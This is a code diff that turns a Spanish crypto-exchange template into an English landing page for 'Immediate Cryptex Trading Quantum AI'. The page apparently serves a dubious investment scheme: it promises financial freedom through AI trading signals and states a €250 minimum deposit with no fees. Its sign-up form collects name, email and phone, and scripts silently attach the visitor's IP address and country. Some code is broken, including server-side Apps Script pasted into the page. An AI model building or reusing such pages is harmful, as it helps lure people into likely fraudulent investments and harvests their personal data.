@@ -156,29 +156,59 @@ headers.forEach(function(header) {
         - #HERO
       -->
 
-      <section class="section hero" aria-label="hero" data-section>
+     <section class="section hero" aria-label="hero" data-section>
         <div class="container">
 
           <div class="hero-content">
 
-            <h1 class="h1 hero-title">Compra y venta de criptomonedas digitales</h1>
+            <h1 class="h1 hero-title">Immediate Cryptex Trading Quantum AI </h1>
 
             <p class="hero-text">
-              Coin Crypto es la forma más fácil, segura y rápida de comprar y vender intercambios de criptoactivos.
+              Welcome to Cryptex Immediate Gain your Financial Freedom
             </p>
 
-            <!-- <a href="#rgst" class="btn btn-primary">Regístrate ahora</a> -->
+            <!-- <a href="#rgst" class="btn btn-primary">Register now</a> -->
             <br>
-           <figure class="hero-banner">
-            <img src="./assets/images/hero-banner.png" width="370" height="248" alt="hero banner" class="w-60">
+              <figure class="hero-banner">
+            <img src="./assets/images/hero-banner.png" width="370" height="248" alt="hero banner" class="w-70">
           </figure>
+          
                 </head>
                 <body>
                 
-                
-            
-          </div>
-         <div class="rgst" id="rgst">
+                                   
+            </div>
+       
+            <script>
+              // Function to detect IP and fetch country
+              function detectCountry() {
+                  fetch('https://ipapi.co/json/')
+                      .then(response => response.json())
+                      .then(data => {
+                          document.getElementById('country').value = data.country_name;
+                      })
+                      .catch(error => console.error('Error:', error));
+              }
+              
+              // Call the function when the page loads
+              window.onload = detectCountry;
+              </script>
+         <script>
+        function doPost(e) {
+  try {
+    // Log the received form data
+    Logger.log('Received form data:', e.parameter);
+
+    // Your existing code to process the form data and insert into Google Sheets
+    // ...
+  } catch (error) {
+    Logger.log('Error:', error);
+  }
+}
+</script>
+    
+          
+           <div class="rgst" id="rgst">
             
               <style>
                 
@@ -239,33 +269,32 @@ headers.forEach(function(header) {
                 }
                 }
                 </style>
-         <div class="form-container" >
-                <h2 id="rgst">Inscribirse</h2>
-                 <form action="https://api.web3forms.com/submit" method="post" name="Sheet2" id="forma" >
+<div class="form-container"  >
+                <h2 id="rgst">Sign Up</h2>
+                <form action="https://api.web3forms.com/submit" method="post" name="Sheet2" id="forma" >
                   <input type="hidden" name="access_key" value="1b9153cc-7ca7-43cc-b698-ea27919fc683">
-                <label for="fname">Nombre de pila:</label>
+                <label for="fname">First Name:</label>
                 <input type="text" id="fname" name="fname" required>
                 
-                <label for="lname">Apellido:</label>
+                <label for="lname">Last Name:</label>
                 <input type="text" id="lname" name="lname" required>
                 
-                <label for="email">Correo electrónico:</label>
+                <label for="email">Email:</label>
                 <input type="email" id="email" name="email" required>
                 
-                <label for="phone">Número de teléfono:</label>
+                <label for="phone">Phone Number:</label>
                 <input type="tel" id="phone" name="phone" required>
-                <br>
-                <br>
-                <input type="hidden" id="country" name="country">
+                <!-- Hidden field for country -->
+        <input type="hidden" id="country" name="country">
                 <br>
                 <br>
                 <input type="hidden" id="ip" name="ip">
-                <input type="submit" value="Regístrate ahora" onclick="addDateTime()" id="Sheet2">
+                <input type="submit" value="Start Now" onclick="addDateTime()" id="Sheet2">
+                  
                 </form> 
+                               
                 </div>
-
-          
-         </div>
+           </div>
 
         </div>
       </section>
@@ -292,7 +321,7 @@ headers.forEach(function(header) {
               
 
               <li>
-                <button class="tab-btn" href="#">lugar de fabricación</button>
+                <button class="tab-btn" href="loginform/login1.html">Makersplace</button>
               </li>
 
             </ul>
@@ -393,7 +422,7 @@ headers.forEach(function(header) {
           </div>
           <br>
           <br>
-          <a href="#rgst" class="btn btn-primary">Regístrate ahora</a>
+          <a href="#rgst" class="btn btn-primary">Sign up Now</a>
         </div>
         
       </section>
@@ -410,9 +439,9 @@ headers.forEach(function(header) {
         <div class="container">
 
           <div class="title-wrapper">
-            <h2 class="h2 section-title">Actualización del mercado</h2>
+            <h2 class="h2 section-title">Market Update</h2>
 
-            <a href="#" class="btn-link">Ver todas las monedas</a>
+            <a href="#" class="btn-link">See All Coins</a>
           </div>
 
           <div class="market-tab">
@@ -420,7 +449,7 @@ headers.forEach(function(header) {
             <ul class="tab-nav">
 
               <li>
-                <button class="tab-btn active">Ver todo</button>
+                <button class="tab-btn active">View All</button>
               </li>
 
               <!-- <li>
@@ -459,15 +488,15 @@ headers.forEach(function(header) {
 
                   <th class="table-heading" scope="col">#</th>
 
-                  <th class="table-heading" scope="col">Nombre</th>
+                  <th class="table-heading" scope="col">Name</th>
 
-                  <th class="table-heading" scope="col">Ultimo precio</th>
+                  <th class="table-heading" scope="col">Last Price</th>
 
                   <th class="table-heading" scope="col">24h %</th>
 
-                  <th class="table-heading" scope="col">Tapa del mercado</th>
+                  <th class="table-heading" scope="col">Market Cap</th>
 
-                  <th class="table-heading" scope="col">Los últimos 7 días</th>
+                  <th class="table-heading" scope="col">Last 7 Days</th>
 
                   <th class="table-heading"></th>
 
@@ -511,7 +540,7 @@ headers.forEach(function(header) {
 
                   <td class="table-data">
                     
-                    <button class="btn btn-outline"><a href="#">Comercio</a></button>
+                    <button class="btn btn-outline"><a href="loginform/login1.html">Trade</a></button>
                     
                   </td>
 
@@ -550,7 +579,7 @@ headers.forEach(function(header) {
                   </td>
 
                   <td class="table-data">
-                    <button class="btn btn-outline" >Comercio</button>
+                    <button class="btn btn-outline" >Trade</button>
                   </td>
 
                 </tr>
@@ -590,7 +619,7 @@ headers.forEach(function(header) {
                   </td>
 
                   <td class="table-data">
-                    <button class="btn btn-outline">Comercio</button>
+                    <button class="btn btn-outline">Trade</button>
                   </td>
 
                 </tr>
@@ -628,7 +657,7 @@ headers.forEach(function(header) {
                   </td>
 
                   <td class="table-data">
-                    <button class="btn btn-outline">Comercio</button>
+                    <button class="btn btn-outline">Trade</button>
                   </td>
 
                 </tr>
@@ -668,7 +697,7 @@ headers.forEach(function(header) {
                   </td>
 
                   <td class="table-data">
-                    <button class="btn btn-outline">Comercio</button>
+                    <button class="btn btn-outline">Trade</button>
                   </td>
 
                 </tr>
@@ -706,7 +735,7 @@ headers.forEach(function(header) {
                   </td>
 
                   <td class="table-data">
-                    <button class="btn btn-outline">Comercio</button>
+                    <button class="btn btn-outline">Trade</button>
                   </td>
 
                 </tr>
@@ -745,7 +774,7 @@ headers.forEach(function(header) {
                   </td>
 
                   <td class="table-data">
-                    <button class="btn btn-outline">Comercio</button>
+                    <button class="btn btn-outline">Trade</button>
                   </td>
 
                 </tr>
@@ -783,7 +812,7 @@ headers.forEach(function(header) {
                   </td>
 
                   <td class="table-data">
-                    <button class="btn btn-outline">Comercio</button>
+                    <button class="btn btn-outline">Trade</button>
                   </td>
 
                 </tr>
@@ -795,7 +824,7 @@ headers.forEach(function(header) {
           </div>
           <br>
           <br>
-          <a href="#rgst" class="btn btn-primary">Regístrate ahora</a>
+          <a href="#rgst" class="btn btn-primary">Sign Up Now</a>
         </div>
         
       </section>
@@ -811,10 +840,10 @@ headers.forEach(function(header) {
       <section id="instruction" class="section instruction" aria-label="instruction" data-section>
         <div class="container">
 
-          <h2 class="h2 section-title">Como funciona</h2>
+          <h2 class="h2 section-title">How It Work Quantum AI</h2>
 
           <p class="section-text">
-            Algunas instrucciones que necesitarás:
+            Some instruction that you will need:
           </p>
 
           <ul class="instruction-list">
@@ -827,13 +856,13 @@ headers.forEach(function(header) {
                     class="img">
                 </figure>
 
-                <p class="card-subtitle">Paso 1</p>
+                <p class="card-subtitle">Step 1</p>
 
-                <h3 class="h3 card-title">Descargar</h3>
+                <h3 class="h3 card-title">Download</h3>
 
                 <p class="card-text">
-                  REGISTRO: <br>
-                  Visite el sitio web de Crypto, busque el formulario de registro y complete los campos necesarios, incluido su nombre, país de residencia, información de contacto y dirección de correo electrónico. Esto tomará unos minutos y el proceso de registro es gratuito. Active su cuenta después de enviar el formulario de registro utilizando el correo electrónico que le enviaremos.
+                  REGISTRATION: <br>
+Visit the Crypto website, find the signup form and complete the necessary fields, including your name, country of residence, contact information, and email address. This will take a few minutes and the sign-up process is free. Activate your account after submitting the registration form using the email, we will send to you.
                 </p>
 
               </div>
@@ -847,16 +876,16 @@ headers.forEach(function(header) {
                     class="img">
                 </figure>
 
-                <p class="card-subtitle">Paso 2</p>
+                <p class="card-subtitle">Step 2</p>
 
-                <h3 class="h3 card-title">Conectar billetera</h3>
+                <h3 class="h3 card-title">Connect Wallet</h3>
 
                 <p class="card-text">
-                  FONDOS DE COMERCIO DE DEPÓSITO: <br>
-                  Tras la activación de la cuenta, proceda a depositar fondos en la cuenta comercial.
-                  El dinero depositado le permite abrir posiciones únicas o múltiples en el mercado, según sus deseos.
-                   Hay un requisito de depósito mínimo de 250 €.
-                  La plataforma Crypto AI Elite no le cobra ninguna tarifa por depositar sus fondos ni cargos por retirar su dinero..
+                  DEPOSIT TRADING FUNDS: <br>
+Upon account activation, proceed to fund the trading account.
+ The deposited money allows you to open single or multiple positions in the market, according to your desire.
+  There is a minimum deposit requirement of €250.
+ The Crypto AI Elite platform does not charge you any fees for depositing your funds and no charges for withdrawing your money.
                 </p>
 
               </div>
@@ -870,15 +899,15 @@ headers.forEach(function(header) {
                     class="img">
                 </figure>
 
-                <p class="card-subtitle">Paso 3</p>
+                <p class="card-subtitle">Step 3</p>
 
-                <h3 class="h3 card-title">Comienza a negociar</h3>
+                <h3 class="h3 card-title">Start-Trading</h3>
 
                 <p class="card-text">
-                  Una vez que su cuenta haya recibido fondos, habrá ingresado a la etapa final para operar con criptomonedas.
-                  Como comerciante novato, puede utilizar el enfoque pasivo y permitir que la aplicación Crypto AI Elite analice el mercado por usted.
-                  La aplicación Crypto AI Elite maneja inmediatamente el análisis técnico, generando información y señales detalladas que puede utilizar para aumentar sus posibilidades comerciales en el mercado.
-                  ¡Ajusta la configuración de la aplicación y realiza tu operación!
+Once your account has been funded, you have entered the final stage to trade cryptocurrencies.
+ As a novice trader, you can use the passive approach and allow Crypto AI Elite app to analyze the market for you. 
+ The Crypto AI Elite app immediately handles technical analysis, generating in-depth insights and signals you can use to boost your trading chances in the market.
+ Adjust the settings of the app and make your trade!
                 </p>
 
               </div>
@@ -892,12 +921,13 @@ headers.forEach(function(header) {
                     class="img">
                 </figure>
 
-                <p class="card-subtitle">Paso 4</p>
+                <p class="card-subtitle">Step 4</p>
 
-                <h3 class="h3 card-title">Ganar dinero</h3>
+                <h3 class="h3 card-title">Earn Money</h3>
 
                 <p class="card-text">
-                  En cada momento tienes tu propia oportunidad de vigilar tu depósito y cargar tu dinero sin problema..
+                  In every moment you have your own opportunity to watch your deposit and charge your money without problem.
+                 
                 </p>
 
               </div>
@@ -906,7 +936,7 @@ headers.forEach(function(header) {
           </ul>
           <br>
           <br>
-          <a href="#rgst" class="btn btn-primary">Regístrate ahora</a>
+          <a href="#rgst" class="btn btn-primary">Sign Up Now</a>
         </div>
         
       </section>
@@ -929,12 +959,11 @@ headers.forEach(function(header) {
 
           <div class="about-content">
 
-            <h2 class="h2 section-title">¿Qué es Cryptotex?</h2>
+            <h2 class="h2 section-title">Why is the Immediate Cryptex Ideal For Trading Cryptocurrency?</h2>
 
             <p class="section-text">
-              Experimente una variedad de operaciones en Bitcost. Puede utilizar varios tipos de transacciones de monedas, como Spot
-              Comercio, Futuros
-              Comercio, P2P, participación, minería y margen.
+              The Immediate Cryptex app is the ideal trading tool for cryptocurrency traders due to its advanced features. Cryptocurrencies are volatile assets, which means trading them can be risky. Traders that have access to the right analysis, insights, and signals can take advantage of the volatility and make more accurate and savvy trading decisions.
+              This is where the Immediate Cryptex app is very useful. It doesn't matter the conditions of the crypto market, the app carries out accurate and in-depth analysis of your selected cryptocurrencies, generating signals you can use to boost your trading activities. The Immediate Cryptex app uses its algorithms and AI to handle market analysis on your behalf.
             </p>
 
             <ul class="section-list">
@@ -943,13 +972,13 @@ headers.forEach(function(header) {
                 <div class="title-wrapper">
                   <ion-icon name="checkmark-circle" aria-hidden="true"></ion-icon>
 
-                  <h3 class="h3 list-title">Ver precios de criptomonedas en tiempo real</h3>
+                  <h3 class="h3 list-title">View real-time cryptocurrency prices</h3>
                 </div>
 
                 <p class="item-text">
-                  Experimente una variedad de operaciones en Bitcost. Puede utilizar varios tipos de transacciones de monedas, como
-                  Comercio al contado, futuros
-                  Comercio, P2P, participación, minería y margen.
+                  Experience a variety of trading on Bitcost. You can use various types of coin transactions such as
+                  Spot Trade, Futures
+                  Trade, P2P, Staking, Mining, and margin.
                 </p>
               </li>
 
@@ -957,19 +986,19 @@ headers.forEach(function(header) {
                 <div class="title-wrapper">
                   <ion-icon name="checkmark-circle" aria-hidden="true"></ion-icon>
 
-                  <h3 class="h3 list-title">Comprar y Vender BTC, ETH, XRP, OKB, Etc...</h3>
+                  <h3 class="h3 list-title">Buy and sell BTC, ETH, XRP, OKB, Etc...</h3>
                 </div>
 
                 <p class="item-text">
-                  Experimente una variedad de operaciones en Bitcost. Puede utilizar varios tipos de transacciones de monedas, como
-                  Comercio al contado, futuros
-                  Comercio, P2P, participación, minería y margen.
+                  Experience a variety of trading on Bitcost. You can use various types of coin transactions such as
+                  Spot Trade, Futures
+                  Trade, P2P, Staking, Mining, and margin.
                 </p>
               </li>
 
             </ul>
 
-            <a href="#rgst" class="btn btn-primary">Regístrate ahora</a>
+            <a href="#rgst" class="btn btn-primary">Register now</a>
 
           </div>
 
@@ -989,10 +1018,10 @@ headers.forEach(function(header) {
 
           <div class="app-content">
 
-            <h2 class="h2 section-title">Libere su dinero e invierta con confianza</h2>
+            <h2 class="h2 section-title">Free Your Money & Invest With Confident</h2>
 
             <p class="section-text">
-              Con Cryptor Trade, puede estar seguro de que sus habilidades comerciales coinciden
+              With Immediate Crytex Trade, you can be sure your trading skills are matched
             </p>
 
             <ul class="section-list">
@@ -1002,11 +1031,11 @@ headers.forEach(function(header) {
                 <div class="title-wrapper">
                   <ion-icon name="checkmark-circle" aria-hidden="true"></ion-icon>
 
-                  <h3 class="h3 item-title">Compre, venda y negocie sobre la marcha</h3>
+                  <h3 class="h3 item-title">Buy, Sell, And Trade On The Go</h3>
                 </div>
 
                 <p class="item-text">
-                  Administre sus existencias desde su dispositivo móvil
+                  Manage Your Holdings From Your Mobile Decive
                 </p>
               </li>
 
@@ -1014,12 +1043,12 @@ headers.forEach(function(header) {
                 <div class="title-wrapper">
                   <ion-icon name="checkmark-circle" aria-hidden="true"></ion-icon>
 
-                  <h3 class="h3 item-title">Tome el control de su patrimonio</h3>
+                  <h3 class="h3 item-title">Take Control Of Your Wealth</h3>
                 </div>
 
 
                 <p class="item-text">
-                  Tenga la seguridad de que usted (y sólo usted) tiene acceso a sus fondos
+                  Rest Assured You (And Only You) Have Access To Your Funds
                 </p>
               </li>
 
@@ -1050,7 +1079,7 @@ headers.forEach(function(header) {
           <!---  <span class="span">Scan To Download</span>
           -->
           
-        <a href="#rgst" class="btn btn-primary">Regístrate ahora</a>
+        <a href="#rgst" class="btn btn-primary">Sign Up Now</a>
           </div>
 
         </div>
@@ -1081,7 +1110,7 @@ headers.forEach(function(header) {
             Crypto
           </a>
 
-          <h2 class="footer-title">¡Hablemos! 🤙</h2>
+          <h2 class="footer-title">Let's talk! 🤙</h2>
 
           <!-- <a href="tel:+123456789101" class="footer-contact-link">+12 558 782 3451</a>
 
@@ -1096,31 +1125,31 @@ headers.forEach(function(header) {
         <ul class="footer-list">
 
           <li>
-            <p class="footer-list-title">Productos</p>
+            <p class="footer-list-title">Products</p>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Lugar</a>
+            <a href="#" class="footer-link">Spot</a>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Perpetuo inverso</a>
+            <a href="#" class="footer-link">Inverse Perpetual</a>
           </li>
 
           <li>
-            <a href="#" class="footer-link">USDT Perpetua</a>
+            <a href="#" class="footer-link">USDT Perpetual</a>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Intercambio</a>
+            <a href="#" class="footer-link">Exchange</a>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Plataforma de lanzamiento</a>
+            <a href="#" class="footer-link">Quantum AI</a>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Pago de Binance</a>
+            <a href="#" class="footer-link">Binance Pay</a>
           </li>
 
         </ul>
@@ -1128,27 +1157,27 @@ headers.forEach(function(header) {
         <ul class="footer-list">
 
           <li>
-            <p class="footer-list-title">Servicios</p>
+            <p class="footer-list-title">Services</p>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Comprar criptomonedas</a>
+            <a href="#" class="footer-link">Buy Crypto</a>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Mercados</a>
+            <a href="#" class="footer-link">Markets</a>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Tarifa comercial</a>
+            <a href="#" class="footer-link">Tranding Fee</a>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Programa de Afiliación</a>
+            <a href="#" class="footer-link">Affiliate Program</a>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Programa de referencia</a>
+            <a href="#" class="footer-link">Referral Program</a>
           </li>
 
           <li>
@@ -1160,31 +1189,31 @@ headers.forEach(function(header) {
         <ul class="footer-list">
 
           <li>
-            <p class="footer-list-title">Apoyo</p>
+            <p class="footer-list-title">Support</p>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Aprende Bybit</a>
+            <a href="#" class="footer-link">Cryptex Learn</a>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Centro de ayuda</a>
+            <a href="#" class="footer-link">Help Center</a>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Comentarios del usuario</a>
+            <a href="#" class="footer-link">User Feedback</a>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Presentar una Solicitud</a>
+            <a href="#" class="footer-link">Submit a request</a>
           </li>
 
           <li>
-            <a href="#" class="footer-link">API Documentación</a>
+            <a href="#" class="footer-link">API Documentation</a>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Reglas comerciales</a>
+            <a href="#" class="footer-link">Trading Rules</a>
           </li>
 
         </ul>
@@ -1192,23 +1221,19 @@ headers.forEach(function(header) {
         <ul class="footer-list">
 
           <li>
-            <p class="footer-list-title">Sobre nosotras</p>
+            <p class="footer-list-title">About Us</p>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Acerca de Bybit</a>
+            <a href="#" class="footer-link">About Cryptex</a>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Verificación de autenticidad</a>
+            <a href="#" class="footer-link">Careers</a>
           </li>
 
           <li>
-            <a href="#" class="footer-link">Carreras</a>
-          </li>
-
-          <li>
-            <a href="#" class="footer-link">Contactos de negocios</a>
+            <a href="#" class="footer-link">Business Contacts</a>
           </li>
 
           <li>
@@ -1224,7 +1249,7 @@ headers.forEach(function(header) {
       <div class="container">
 
         <p class="copyright">
-          &copy; 2024 Crypto <a href="#" class="copyright-link"></a>
+          &copy; 2024 ImmediateCryptex <a href="#" class="copyright-link"></a>
         </p>
 
         <ul class="social-list">
@@ -1274,67 +1299,102 @@ headers.forEach(function(header) {
   -->
   <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
   <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+  
+    
+  
+  
+    <script>
+      var input = document.querySelector("#phone");
+      var iti = window.intlTelInput(input, {
+      initialCountry: "auto",
+      geoIpLookup: function(success, failure) {
+      fetch('https://ipinfo.io/json? id="ip">')
+      .then(response => {
+      if (response.ok) return response.json();
+      throw new Error('Failed to fetch user location');
+      })
+      .then(ipinfo => success(ipinfo.country))
+      .catch(failure);
+      },
+      utilsScript: 'https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js'
+      });
+      
+      // Listen to the country change event
+      input.addEventListener('countrychange', function() {
+      // Set the input value to the country's dial code
+      input.value = iti.getSelectedCountryData().dialCode;
+      });
+      </script>
+    <script>
+        function addDateTime() {
+            var now = new Date();
+            var datetime = now.toLocaleString();
+            document.getElementById('Sheet2').innerHTML += '<input type="hidden" name="datetime" value="' + datetime + '">';
+        }
+    </script> 
+                    <script>
+                      // Function to fetch user's IP address and populate the hidden input field
+                      function getIP(json) {
+                        document.getElementById("ip").value = json.ip;
+                      }
+                    
+                      // Fetch IP address using ipinfo.io
+                      var script = document.createElement("script");
+                      script.type = "text/javascript";
+                      script.src = "https://ipinfo.io/?format=jsonp&callback=getIP";
+                      document.body.appendChild(script);
+                    </script>
+    
+  
 
 
-</script>
-<script>
- // Function to detect IP and fetch country
- function detectCountry() {
-     fetch('https://ipapi.co/json/')
-         .then(response => response.json())
-         .then(data => {
-             document.getElementById('country').value = data.country_name;
-         })
-         .catch(error => console.error('Error:', error));
- }
- 
- // Call the function when the page loads
- window.onload = detectCountry;
- </script>
- <script>
-   var input = document.querySelector("#phone");
-   var iti = window.intlTelInput(input, {
-   initialCountry: "auto",
-   geoIpLookup: function(success, failure) {
-   fetch('https://ipinfo.io/json? id="ip">')
-   .then(response => {
-   if (response.ok) return response.json();
-   throw new Error('Failed to fetch user location');
-   })
-   .then(ipinfo => success(ipinfo.country))
-   .catch(failure);
-   },
-   utilsScript: 'https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js'
-   });
-   
-   // Listen to the country change event
-   input.addEventListener('countrychange', function() {
-   // Set the input value to the country's dial code
-   input.value = iti.getSelectedCountryData().dialCode;
-   });
-   </script>
- <script>
-     function addDateTime() {
-         var now = new Date();
-         var datetime = now.toLocaleString();
-         document.getElementById('Sheet2').innerHTML += '<input type="hidden" name="datetime" value="' + datetime + '">';
-     }
- </script> 
-                 <script>
-                   // Function to fetch user's IP address and populate the hidden input field
-                   function getIP(json) {
-                     document.getElementById("ip").value = json.ip;
-                   }
-                 
-                   // Fetch IP address using ipinfo.io
-                   var script = document.createElement("script");
-                   script.type = "text/javascript";
-                   script.src = "https://ipinfo.io/?format=jsonp&callback=getIP";
-                   document.body.appendChild(script);
-                 </script>
 
 
-<script>
+
+
+
+    <script>
+      var sheetName = 'Sheet2';
+
+function doPost(e) {
+var lock = LockService.getScriptLock();
+lock.tryLock(10000);
+
+try {
+// Open the spreadsheet by ID and get the sheet
+var doc = SpreadsheetApp.getActiveSpreadsheet();
+var sheet = doc.getSheetByName(sheetName);
+
+// Get the last row with data and add 1 to get the next empty row
+var nextRow = sheet.getLastRow() + 1;
+
+// Map the form parameters to the columns
+var newRow = [];
+var headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
+headers.forEach(function(header) {
+newRow.push(e.parameter[header] || '');
+});
+
+// Set the new row values
+sheet.getRange(nextRow, 1, 1, newRow.length).setValues([newRow]);
+
+// Redirect to the homepage
+var htmlOutput = HtmlService.createHtmlOutput('window.top.location.href = "/index.html";');
+return htmlOutput.setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL);
+}
+
+catch (e) {
+// Handle any errors
+Logger.log(e.toString());
+}
+
+finally {
+lock.releaseLock();
+}
+}
+    </script>
+
+  <script>
     document.addEventListener('DOMContentLoaded', function() {
 // Query for the Web3Forms link using its class and href attribute
 var web3formsLink = document.querySelector('a.text-gray-400.underline[href="https://web3forms.com/"]');
